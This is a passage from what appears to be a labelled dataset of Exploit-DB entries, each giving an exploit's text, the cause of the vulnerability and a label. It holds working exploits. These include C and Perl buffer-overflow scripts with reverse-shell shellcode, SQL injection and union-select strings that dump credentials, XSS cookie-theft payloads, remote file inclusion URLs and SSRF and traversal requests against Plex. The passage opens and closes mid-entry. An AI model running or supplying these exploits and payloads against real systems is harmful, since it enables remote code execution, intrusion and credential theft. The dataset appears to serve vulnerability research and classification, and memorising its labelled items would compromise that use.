added.\n"", (addr_ret_addr - temp_addr) %4);  /* set return adress.. hopefully in exploit code.... */     temp_addr2 = start_realpath + length_tftpdir + (num_nops / 2);     if (!(temp_addr2 & 0xff)) temp_addr2++;     printf(""Setting return addr to: %x \n"", temp_addr2);     q = (unsigned long *) p;     do {         *q++ = temp_addr2;         p = (char *) q;     } while ((p - bp->bp_file) < exploit_length);     *p++ = '\0';    printf(""Exploit length: %d"", strlen(bp->bp_file)); }  void get_args(int argc, char *argv[]) {     int ch;     while ((ch = getopt(argc, argv, ""c:s:a:e:"")) != EOF) {         switch(ch) {             case 'c':                 strcpy(client_addr, optarg);                 break;             case 's':                 strcpy(host_addr, optarg);                 break;             case 'a':                 realpath_adjust = atoi(optarg);                 break;             case 'e':                 exploit_length = atoi(optarg);                 break;             default:                 usage();         }     } }  void usage(void) {     printf(""bootpd exploit against debian linux 1.3 and 2.0 (probably others)\n"");     printf(""\nBy Willem Pinckaers (W.H.J.Pinckaers@cpedu.rug.nl) 1998\n"");     printf(""\nUsage:\n\tbootpd: -c client_addr -s server_addr -a offset\n"");     exit(1); } --------- CUT HERE --------- --------- CUT HERE --------- /*  * Exploit code, casts a shell to a remote host  * (C) 1998 Willem Pinckaers (W.H.J.Pinckaers@cpedu.rug.nl  */ void main() {     __asm__(""                 xorl %ecx, %ecx                 movl %ecx, %eax                 addb $0x66, %al                 incl %ecx                 movl %ecx, %edx                 movl %ecx, %ebx                 jmp endc0de                 realstart:                 popl %edi                 movl %ecx,0x08(%edi)                 incl %ecx                 movl %ecx,0x04(%edi)                 addb $04,%cl                 movl %ecx,0x0c(%edi)                 leal 04(%edi), %ecx                 int $0x80                 movl %eax, (%edi)                 xorl %ecx, %ecx                 addb $02, %cl                 movw %cx, 0xc(%edi)                 movw %cx, 0xe(%edi)                 addb $0x0e, %cl                 movw %cx, 0x8(%edi)                 movw $0x3930, %cx                 movw %cx, 0xe(%edi)                 leal 0x0c(%edi), %eax                 movl %eax, 0x04(%edi)                 xorl %ecx, %ecx                 movb $03, %cl                 movl %ecx, %edx                 movl %ecx, %ebx                 movl %edi, %ecx                 xorl %eax, %eax                 addb $0x66, %al                 int $0x080              // connect                 xorl %eax,%eax                 movl %eax, %ecx                 addb $0x3f, %al                 movl %eax, %edx                 movl (%edi), %ebx                 int $0x80               // dup2                 movl %edx, %eax                 incl %ecx                 int $0x80               // dup2                 movl %edx, %eax                 incl %ecx                 int $0x80               // dup2                 xorl %eax, %eax                 movl %eax, 0x10(%edi)           // pointer = NULL                 movb %al, 0x1b(%edi)            // terminate /bin/sh                 leal 0x14(%edi), %eax           // start van /bin/sh                 movl %eax, 0x0c(%edi)                 xorl %eax, %eax                 addb $0x0b, %al                 leal 0x14(%edi), %ebx                 leal 0x0c(%edi), %ecx                 leal 0x10(%edi), %edx                 int $0x80                       // execve                 xorl %eax,%eax                 incl %eax                 int $0x80                 endc0de:                 call realstart                 sockfd:                 .byte 0x2e, 'A', 'A', 'A'                 .byte 'A', 'A', 'A', 'A'                 .byte 'A', 'A', 'A', 'A'                 sockaddr:                 .byte 'A', 'A'                  // must contain 02                 .byte 0x39, 0x30                // must contain port nr                 .byte 192, 168, 01, 01          // must contain ip                 .string \""/bin/sh\""""); }","improper bounds checking in the handling of the boot file/location specified in a bootp request packet, and in the error logging facility",1
33684,"Blax Blog 0.1 - 'girisyap.php' SQL Injection source: https://www.securityfocus.com/bid/38465/info  Blax Blog is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Blax Blog 0.1 is vulnerable; other versions may also be affected.   http://www.example.com/admin/girisyap.php  Username: ' or '1=1 password: ' or '1=1",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
37583,"YT-Videos Script - 'id' SQL Injection source: https://www.securityfocus.com/bid/54859/info  YT-Videos Script is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/demo/ytvideos/play.php?id=2'",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
35575,PrestaShop 1.3.6 - 'cms.php' Remote File Inclusion source: https://www.securityfocus.com/bid/47264/info  PrestaShop is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied input.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  PrestaShop 1.3.6 and prior are vulnerable; other versions may also be affected.  http://www.example.com/[path]/cms.php?rewrited_url=http://[Shell-Path],fails to sufficiently sanitize user-supplied input,1
31720,QT-cute QuickTalk Guestbook 1.6 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/29013/info  QT-cute QuickTalk Guestbook is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  QuickTalk Guestbook 1.6 is vulnerable; other versions may also be affected.  http://www.example.com/quicktalk/qtf_cmd.php?a=[XSS] http://www.example.com/quicktalk/qtf_ind_search_kw.php?title=[XSS] http://www.example.com/quicktalk/qtf_ind_search_ov.php?a=[XSS] http://www.example.com/quicktalk/qtf_ind_search_ov.php?a=user&id=2&n=[XSS] http://www.example.com/quicktalk/qtf_ind_search_ov.php?a=user&id=[XSS] http://www.example.com/quicktalk/qtf_ind_search_kw.php?title=adasdasdadasda&f=-1&al=0&at=0&s=[XSS] http://www.example.com/quicktalk/qtf_ind_stat.php?y=[XSS] http://www.example.com/quicktalk/qtf_ind_post.php?f=1&t=1[XSS] http://www.example.com/quicktalk/qtf_adm_cmd.php?a=[XSS],fails to properly sanitize user-supplied input,1
31367,"Batchelor Media BM Classifieds - Multiple SQL Injections source: https://www.securityfocus.com/bid/28159/info  BM Classifieds is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/showad.php?listingid=xCoRpiTx&cat=-99/**/union+select/**/concat(username,0x3a,email),password,2/**/from/**/users/* http://www.example.com/pfriendly.php?ad=-99%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0,1,concat(username,0x3a,email),password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
30158,Joomla! Component JD-Wiki 1.0.2 - 'wantedpages.php?MosConfig_absolute_path' Remote File Inclusion source: https://www.securityfocus.com/bid/24342/info   JD-Wiki is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and to gain access to the underlying system.   JD-Wiki 1.0.2 and earlier versions are vulnerable to this issue; other versions may also be affected.   http://www.example.com/components/com_jd-wiki/bin/wantedpages.php?mosConfig_absolute_path=,fails to properly sanitize user-supplied input,1
35714,"BlueVoda Website Builder 11 - '.bvp' Local Stack Buffer Overflow source: https://www.securityfocus.com/bid/47753/info  BlueVoda Website Builder is prone to a stack-based buffer-overflow vulnerability because the application fails to properly bounds-check user-supplied data before copying it into an insufficiently sized buffer.  An attacker could exploit this issue to execute arbitrary code in the context of the affected application. Failed exploit attempts will likely result in denial-of-service conditions.  BlueVoda Website Builder 11 is vulnerable; other versions may also be affected.   #!/usr/bin/perl system(""cls""); sub logo(){ print q' 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1 1                      ______                                          0 0                   .-""      ""-.                                       1 1                  / KedAns-Dz  \ =-=-=-=-=-=-=-=-=-=-=-|              0 0 Algerian HaCker |              | > Site : 1337day.com |              1 1 --------------- |,  .-.  .-.  ,| > Twitter : @kedans  |              0 0                 | )(_o/  \o_)( | > ked-h@hotmail.com  |              1 1                 |/     /\     \| =-=-=-=-=-=-=-=-=-=-=|              0 0       (@_       (_     ^^     _)  HaCkerS-StreeT-Team                1 1  _     ) \_______\__|IIIIII|__/_______________________               0 0 (_)@8@8{}<________|-\IIIIII/-|________________________>              1 1        )_/        \          /                                       0 0       (@           `--------` . 2011, Inj3ct0r Team                  1 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-0 0     BlueVoda Website Builder v.11 (.bvp) Stack Buffer Overflow       1 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-0 '; } # --------- # BlueVoda Website Builder v.11 (.bvp) Stack Buffer Overflow # Author : KedAns-Dz <ked-h@hotmail.com || ked-h@exploit-id.com> # special thanks to : Inj3ct0r Team + Exploit-Id Team # Tested in Windows XP sp3 France # --------- logo(); my $header = # BlueVoda Project (bvp) Header ""\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\x00\x00\x00\x00\x00\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x3e\x00\x03\x00\xfe\xff\x09""; my $jump = ""\xeb\x02\x90\x90"" ; # short jump - from BlueVoda.exe my $call = ""\xff\x52\x7c""; # Call - from BlueVoda.exe my $junk = ""\x41"" x 321; # Buffer my $nops = ""\x90"" x 51; # Nopsled # windows/shell_reverse_tcp - 340 bytes (http://www.metasploit.com) # LHOST=127.0.0.1, LPORT=4444, Encoder: x86/call4_dword_xor my $shell =  ""\x29\xc9\x83\xe9\xb1\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"" . ""\x0e\x4e\x5a\xfa\xc3\x83\xee\xfc\xe2\xf4\xb2\xb2\x73\xc3"" . ""\x4e\x5a\x9a\x4a\xab\x6b\x28\xa7\xc5\x08\xca\x48\x1c\x56"" . ""\x71\x91\x5a\xd1\x88\xeb\x41\xed\xb0\xe5\x7f\xa5\xcb\x03"" . ""\xe2\x66\x9b\xbf\x4c\x76\xda\x02\x81\x57\xfb\x04\xac\xaa"" . ""\xa8\x94\xc5\x08\xea\x48\x0c\x66\xfb\x13\xc5\x1a\x82\x46"" . ""\x8e\x2e\xb0\xc2\x9e\x0a\x71\x8b\x56\xd1\xa2\xe3\x4f\x89"" . ""\x19\xff\x07\xd1\xce\x48\x4f\x8c\xcb\x3c\x7f\x9a\x56\x02"" . ""\x81\x57\xfb\x04\x76\xba\x8f\x37\x4d\x27\x02\xf8\x33\x7e"" . ""\x8f\x21\x16\xd1\xa2\xe7\x4f\x89\x9c\x48\x42\x11\x71\x9b"" . ""\x52\x5b\x29\x48\x4a\xd1\xfb\x13\xc7\x1e\xde\xe7\x15\x01"" . ""\x9b\x9a\x14\x0b\x05\x23\x16\x05\xa0\x48\x5c\xb1\x7c\x9e"" . ""\x26\x69\xc8\xc3\x4e\x32\x8d\xb0\x7c\x05\xae\xab\x02\x2d"" . ""\xdc\xc4\xb1\x8f\x42\x53\x4f\x5a\xfa\xea\x8a\x0e\xaa\xab"" . ""\x67\xda\x91\xc3\xb1\x8f\xaa\x93\x1e\x0a\xba\x93\x0e\x0a"" . ""\x92\x29\x41\x85\x1a\x3c\x9b\xd3\x3d\xab\x31\x5a\xfa\xc2"" . ""\x26\x58\xfa\xd2\x12\xd3\x1c\xa9\x5e\x0c\xad\xab\xd7\xff"" . ""\x8e\xa2\xb1\x8f\x92\xa0\x23\x3e\xfa\x4a\xad\x0d\xad\x94"" . ""\x7f\xac\x90\xd1\x17\x0c\x18\x3e\x28\x9d\xbe\xe7\x72\x5b"" . ""\xfb\x4e\x0a\x7e\xea\x05\x4e\x1e\xae\x93\x18\x0c\xac\x85"" . ""\x18\x14\xac\x95\x1d\x0c\x92\xba\x82\x65\x7c\x3c\x9b\xd3"" . ""\x1a\x8d\x18\x1c\x05\xf3\x26\x52\x7d\xde\x2e\xa5\x2f\x78"" . ""\xbe\xef\x58\x95\x26\xfc\x6f\x7e\xd3\xa5\x2f\xff\x48\x26"" . ""\xf0\x43\xb5\xba\x8f\xc6\xf5\x1d\xe9\xb1\x21\x30\xfa\x90"" . ""\xb1\x8f\xfa\xc3""; my $exploit = $header.$jump.$junk.$call.$shell.$nops;  open(myfile,'>>KedAns.bvp'); print myfile $exploit; close (myfile);",the application fails to properly bounds-check user-supplied data before copying it into an insufficiently sized buffer,1
28273,PHPSavant Savant2 - 'Stylesheet.php?MosConfig_absolute_path' Remote File Inclusion source: https://www.securityfocus.com/bid/19151/info  Savant2 is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and to gain access to the underlying system.  http://www.example.com/[mam_jom_path]/components/com_mtree/Savant2/Savant2_Plugin_stylesheet.php?mosConfig_absolute_path=EvilScript.txt?&cmd=id,fails to properly sanitize user-supplied input,1
32989,"Verlihub Control Panel 1.7 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/34856/info  Verlihub Control Panel is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  The issues affect Verlihub Control Panel 1.7e; other versions may also be affected.  http://www.example.com/index.php?page=login&nick=""><script>alert(""Vulnerable"");</script> http://www.example.com/index.php?page=login&nick=""><iframe src= http://www.example.com/index.html?news></iframe>",the application fails to properly sanitize user-supplied input,1
24816,"PHPGedView 2.5/2.6 - 'Individual.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/11882/info  It is reported that PhpGedView is affected by a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied URI input.  This issue could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were to be followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.  http://www.example.com/phpgedview/individual.php?pid=""><iframe>",a failure of the application to properly sanitize user-supplied URI input,1
29537,"MDPro 1.0.76 - 'index.php' SQL Injection source: https://www.securityfocus.com/bid/22293/info  MDPro is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  Version 1.0.76 is vulnerable to this issue; other versions may also be affected.   http://www.example.com/index.php?module=News&startrow='[sql injection]",the application fails to properly sanitize user-supplied input before using it in an SQL query,1
29749,Oracle Portal 10g - 'P_OldURL' Cross-Site Scripting source: https://www.securityfocus.com/bid/22999/info  Oracle Portal is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/pls/portal/PORTAL.wwv_main.render_warning_screen?p_oldurl='<script>alert('inT')</script>&p_newurl='<script>alert('ellect')</script>,the application fails to properly sanitize user-supplied input,1
39324,"Wireshark - dissect_nhdr_extopt Stack Buffer Overflow Source: https://code.google.com/p/google-security-research/issues/detail?id=696  The following crash due to a stack-based buffer overflow can be observed in an ASAN build of Wireshark (current git master), by feeding a malformed file to tshark (""$ ./tshark -nVxr /path/to/file""):  --- cut --- ==24710==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe68161a6c at pc 0x0000004ab766 bp 0x7ffe681503f0 sp 0x7ffe6814fba0 WRITE of size 120 at 0x7ffe68161a6c thread T0     #0 0x4ab765 in __asan_memcpy llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:393     #1 0x7ff89a5f89ec in tvb_memcpy wireshark/epan/tvbuff.c:783:10     #2 0x7ff89b7ba95c in dissect_nhdr_extopt wireshark/epan/dissectors/packet-lbmc.c:10013:13     #3 0x7ff89b7a1a54 in lbmc_dissect_lbmc_packet wireshark/epan/dissectors/packet-lbmc.c:11039:41     #4 0x7ff89b82ece9 in dissect_lbttcp_pdu wireshark/epan/dissectors/packet-lbttcp.c:620:21     #5 0x7ff89c4a5254 in tcp_dissect_pdus wireshark/epan/dissectors/packet-tcp.c:2762:13     #6 0x7ff89b82c7dc in dissect_lbttcp_real wireshark/epan/dissectors/packet-lbttcp.c:642:5     #7 0x7ff89b82ad4e in test_lbttcp_packet wireshark/epan/dissectors/packet-lbttcp.c:698:5     #8 0x7ff89a4b1c57 in dissector_try_heuristic wireshark/epan/packet.c:2332:7     #9 0x7ff89c4a6de0 in decode_tcp_ports wireshark/epan/dissectors/packet-tcp.c:4644:13     #10 0x7ff89c4ac5e3 in process_tcp_payload wireshark/epan/dissectors/packet-tcp.c:4690:13     #11 0x7ff89c4a765b in dissect_tcp_payload wireshark/epan/dissectors/packet-tcp.c:4771:9     #12 0x7ff89c4bc7f0 in dissect_tcp wireshark/epan/dissectors/packet-tcp.c:5623:13     #13 0x7ff89a4b74a1 in call_dissector_through_handle wireshark/epan/packet.c:619:8     #14 0x7ff89a4a9e2a in call_dissector_work wireshark/epan/packet.c:694:9     #15 0x7ff89a4a95fd in dissector_try_uint_new wireshark/epan/packet.c:1151:9     #16 0x7ff89b5f0e0b in ip_try_dissect wireshark/epan/dissectors/packet-ip.c:1976:7     #17 0x7ff89b5fba21 in dissect_ip_v4 wireshark/epan/dissectors/packet-ip.c:2468:10     #18 0x7ff89b5f1569 in dissect_ip wireshark/epan/dissectors/packet-ip.c:2491:5     #19 0x7ff89a4b74a1 in call_dissector_through_handle wireshark/epan/packet.c:619:8     #20 0x7ff89a4a9e2a in call_dissector_work wireshark/epan/packet.c:694:9     #21 0x7ff89a4a95fd in dissector_try_uint_new wireshark/epan/packet.c:1151:9     #22 0x7ff89a4aa1a4 in dissector_try_uint wireshark/epan/packet.c:1177:9     #23 0x7ff89bdd7830 in dissect_ppp_common wireshark/epan/dissectors/packet-ppp.c:4346:10     #24 0x7ff89bdd6fec in dissect_ppp_hdlc_common wireshark/epan/dissectors/packet-ppp.c:5339:5     #25 0x7ff89bdcf2a5 in dissect_ppp_hdlc wireshark/epan/dissectors/packet-ppp.c:5380:5     #26 0x7ff89a4b74a1 in call_dissector_through_handle wireshark/epan/packet.c:619:8     #27 0x7ff89a4a9e2a in call_dissector_work wireshark/epan/packet.c:694:9     #28 0x7ff89a4a95fd in dissector_try_uint_new wireshark/epan/packet.c:1151:9     #29 0x7ff89b1e60d3 in dissect_frame wireshark/epan/dissectors/packet-frame.c:491:11     #30 0x7ff89a4b74a1 in call_dissector_through_handle wireshark/epan/packet.c:619:8     #31 0x7ff89a4a9e2a in call_dissector_work wireshark/epan/packet.c:694:9     #32 0x7ff89a4b396e in call_dissector_only wireshark/epan/packet.c:2665:8     #33 0x7ff89a4a53df in call_dissector_with_data wireshark/epan/packet.c:2678:8     #34 0x7ff89a4a4a2b in dissect_record wireshark/epan/packet.c:502:3     #35 0x7ff89a4559b9 in epan_dissect_run_with_taps wireshark/epan/epan.c:376:2     #36 0x52856b in process_packet wireshark/tshark.c:3728:5     #37 0x5219e0 in load_cap_file wireshark/tshark.c:3484:11     #38 0x517e2c in main wireshark/tshark.c:2197:13  Address 0x7ffe68161a6c is located in stack of thread T0 at offset 65644 in frame     #0 0x7ff89b79d1ff in lbmc_dissect_lbmc_packet wireshark/epan/dissectors/packet-lbmc.c:10597    This frame has 17 object(s):     [32, 36) 'bhdr'     [48, 52) 'msgprop_len'     [64, 80) 'frag_info'     [96, 65644) 'reassembly' <== Memory access at offset 65644 overflows this variable     [65904, 65908) 'data_is_umq_cmd_resp'     [65920, 65940) 'stream_info'     [65984, 65996) 'ctxinstd_info'     [66016, 66028) 'ctxinstr_info'     [66048, 66120) 'destination_info'     [66160, 66416) 'found_header'     [66480, 66584) 'uim_stream_info'     [66624, 66632) 'tcp_sid_info'     [66656, 66672) 'tcp_addr'     [66688, 66692) 'tcp_session_id'     [66704, 66712) 'hdtbl_entry'     [66736, 66740) 'encoding'     [66752, 66756) 'pdmlen' HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext       (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-buffer-overflow llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:393 in __asan_memcpy Shadow bytes around the buggy address:   0x10004d0242f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x10004d024300: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x10004d024310: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x10004d024320: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x10004d024330: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x10004d024340: 00 00 00 00 00 00 00 00 00 00 00 00 00[04]f2 f2   0x10004d024350: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2   0x10004d024360: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 04 f2   0x10004d024370: 00 00 04 f2 f2 f2 f2 f2 00 04 f2 f2 00 04 f2 f2   0x10004d024380: 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 f2 00 00   0x10004d024390: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Heap right redzone:      fb   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack partial redzone:   f4   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==24710==ABORTING --- cut ---  The crash was reported at https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=11984. Attached are two files which trigger the crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39324.zip",a stack-based buffer overflow,1
22663,Newsscript 1.0 - Administrative Privilege Escalation source: https://www.securityfocus.com/bid/7705/info  A vulnerability has been reported that could enable a member of the news system to create and access an administrative account. This is due to insufficient validation of data supplied to account editing input fields of Newsscript.  Peter<~>2,insufficient validation of data supplied to account editing input fields of Newsscript,1
31983,"Plex Media Server 0.9.9.2.374-aa23a69 - Multiple Vulnerabilities SEC Consult Vulnerability Lab Security Advisory < 20140228-1 > ======================================================================= title: Authentication bypass (SSRF) and local file disclosure product: Plex Media Server vulnerable version: <=0.9.9.2.374-aa23a69 fixed version: >=0.9.9.3 impact: Critical homepage: http://www.plex.tv found: 2014-02-06 by: Stefan ViehbÃ¶ck SEC Consult Vulnerability Lab https://www.sec-consult.com =======================================================================  Vendor/product description: ----------------------------- ""Plex is a media player system consisting of a player application with a 10-foot user interface and an associated media server. It is available for Mac OS X, Linux, and Microsoft Windows.""  URL: https://en.wikipedia.org/wiki/Plex_(software)  Vulnerability overview/description: ----------------------------------- 1. Authentication bypass / Server Side Request Forgery (SSRF) The Plex Media Server ""/system/proxy"" functionality fails to properly validate pre-authentication user requests. This allows unauthenticated attackers to make the Plex Media Server execute arbitrary HTTP requests.  By requesting content from 127.0.0.1 an attacker can bypass all authentication and execute commands with administrative privileges.  2. Unauthenticated local file disclosure Because of insufficient input validation, arbitrary local files can be disclosed. Files that include passwords and other sensitive information can be accessed.  Plex ""Remote"" servers (thousands of them can be found via Shodan and Google, none of them were accessed) are affected by both vulnerabilities as well.  Proof of concept: ----------------- 1. Authentication bypass / Server Side Request Forgery (SSRF) The following GET request bypasses the webserver whitelist.  GET /system/proxy HTTP/1.1 Host: <PLEX_WAN_HOST> X-Plex-Url: http://localhost:32400/myplex/account?IRRELEVANT= X-Plex-Url: http://my.plexapp.com/  The last X-Plex-Url header value ""http://my.plexapp.com/"" is contained in the whitelist (Regex) and passes validation. The request is then processed by the actual request handler in the backend webserver (Python). Here both header values are concatenated using a comma. This way the actual URL that is requested is controlled by the first X-Plex-Url value. By indicating a parameter (called IRRELEVANT) the second X-Plex-Url value is dissolved.  This results in the following request (made by Plex Media Server):  GET /myplex/account?IRRELEVANT=,http://my.plexapp.com/ HTTP/1.1 Host: localhost:32400 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729) Connection: close Accept: */* Accept-Encoding: gzip  The response for this request is passed to the attacker and includes the authToken value (""master token""), which can be used to impersonate legitimate Plex users. Of course other administrative actions can be performed as well.  <?xml version=""1.0"" encoding=""UTF-8""?> <MyPlex authToken=""<REMOVED>"" username=""<REMOVED>"" mappingState=""mapped"" mappingError="""" mappingErrorMessage=""1"" signInState=""ok"" publicAddress=""1"" publicPort=""9415"" privateAddress=""1"" privatePort=""32400"" subscriptionFeatures=""cloudsync,pass,sync"" subscriptionActive=""1"" subscriptionState=""Active""> </MyPlex>  A video demonstrating this issue has been released by SEC Consult: http://www.youtube.com/watch?v=f99fm4QU9u8  2. Unauthenticated local file disclosure The following requests show different functionality that is vulnerable to directory traversal:  GET /manage/..\..\..\..\..\..\..\..\..\..\secret.txt HTTP/1.1 Host: <HOST>  GET /web/..\..\..\..\..\..\..\..\..\..\secret.txt HTTP/1.1 Host: <HOST>  GET /:/resources/..\..\..\..\..\..\..\..\..\..\secret.txt HTTP/1.1 Host: <HOST>  The /manage/ and /web/ handlers can be exploited without prior authentication. This vulnerability was confirmed on Windows.  Vulnerable / tested versions: ----------------------------- The vulnerabilities have been verified to exist in Plex Media Server version 0.9.9.2.374-aa23a69.  Vendor contact timeline: ------------------------ 2014-02-09: Contacting vendor through elan (at) plexapp (dot) com [email concealed] and requesting encryption keys. 2014-02-10: Vendor provides encryption keys. 2014-02-10: Sending advisory and proof of concept exploit. 2014-02-10: Vendor acknowledges receipt of advisory. 2014-02-17: Requesting status update. 2014-02-17: Vendor provides release timeline. 2014-02-20: Vendor releases fixed version (0.9.9.3). 2014-02-21: Requesting clarification regarding fixed version. 2014-02-21: Vendors provides further information about fixed version and other reported vulnerabilities. 2014-02-28: SEC Consult releases coordinated security advisory.  Solution: --------- Update to a more recent version of Plex Media Server (eg. 0.9.9.5).  Workaround: ----------- No workaround available.  Advisory URL: ------------- https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SEC Consult Vulnerability Lab  SEC Consult Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius  Headquarter: Mooslackengasse 17, 1190 Vienna, Austria Phone: +43 1 8903043 0 Fax: +43 1 8903043 15  Mail: research at sec-consult dot com Web: https://www.sec-consult.com Blog: http://blog.sec-consult.com Twitter: https://twitter.com/sec_consult  Interested in working with the experts of SEC Consult? Write to career (at) sec-consult (dot) com [email concealed]  EOF Stefan ViehbÃ¶ck / @2014",fails to properly validate pre-authentication user requests,1
27344,"NZ eCommerce System - 'index.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/16931/info  NZ Ecommerce is prone to multiple input-validation vulnerabilities. These issues are due to the application's failure to properly sanitize user-supplied input.   A successful exploit could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  http://www.example.com/index.php?action=Information&informationID=[SQL] http://www.example.com//index.php?action=DisplayOverviewproduct&ParentCategory=[SQL]",the application's failure to properly sanitize user-supplied input,1
24348,"eNdonesia 8.3 - Search Form Cross-Site Scripting source: https://www.securityfocus.com/bid/10856/info  It is reported that eNdonesia is susceptible to a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated web content.  As a result of this vulnerability, it is possible for a remote attacker to create a malicious link containing script code that will be executed in the browser of a legitimate user. Specifically the attacker can pass malicious HTML code as a value for the affected URI parameter supplied to 'mod.php'. All code will be executed within the context of the website running the vulnerable software.  This may allow for theft of cookie-based authentication credentials and other attacks.   Version 8.3 of the software is reported vulnerable. Other versions may also be affected.  http://www.example.com/mod.php?mod=publisher&op=search&query=%3Cscript%3Ealert(document.cookie)%3C/script%3E",a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated web content,1
41904,"Oracle VM VirtualBox - Guest-to-Host Privilege Escalation via Broken Length Handling in slirp Copy Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1086  There is a vulnerability in VirtualBox that permits an attacker with root privileges in a virtual machine with a NAT network interface to corrupt the memory of the userspace host process and leak memory contents from the userspace host process. This probably permits an attacker with root privileges inside the guest to execute arbitrary code in userspace context on the host.  The issue is in the copy of slirp that is shipped in VirtualBox, in the function ip_input() in src/VBox/Devices/Network/slirp/ip_input.c:  void ip_input(PNATState pData, struct mbuf *m) {     register struct ip *ip;     [...]     ip = mtod(m, struct ip *);     [...]     {         [...]         /*          * XXX: TODO: this is most likely a leftover spooky action at          * a distance from alias_dns.c host resolver code and can be          * g/c'ed.          */         if (m->m_len != RT_N2H_U16(ip->ip_len))             m->m_len = RT_N2H_U16(ip->ip_len);     }     [...] }  This code does not seem to be present in the upstream version of slirp.  The assignment `m->m_len = RT_N2H_U16(ip->ip_len)` overwrites the trusted length field `m_len` of the buffer `m` with the untrusted length field in the IP header of the received packet. At this point, the IP header has not been validated at all. All following code that processes packets relies on the correctness of `m->m_len`, so by sending an IP header with a bogus length field, an attacker can 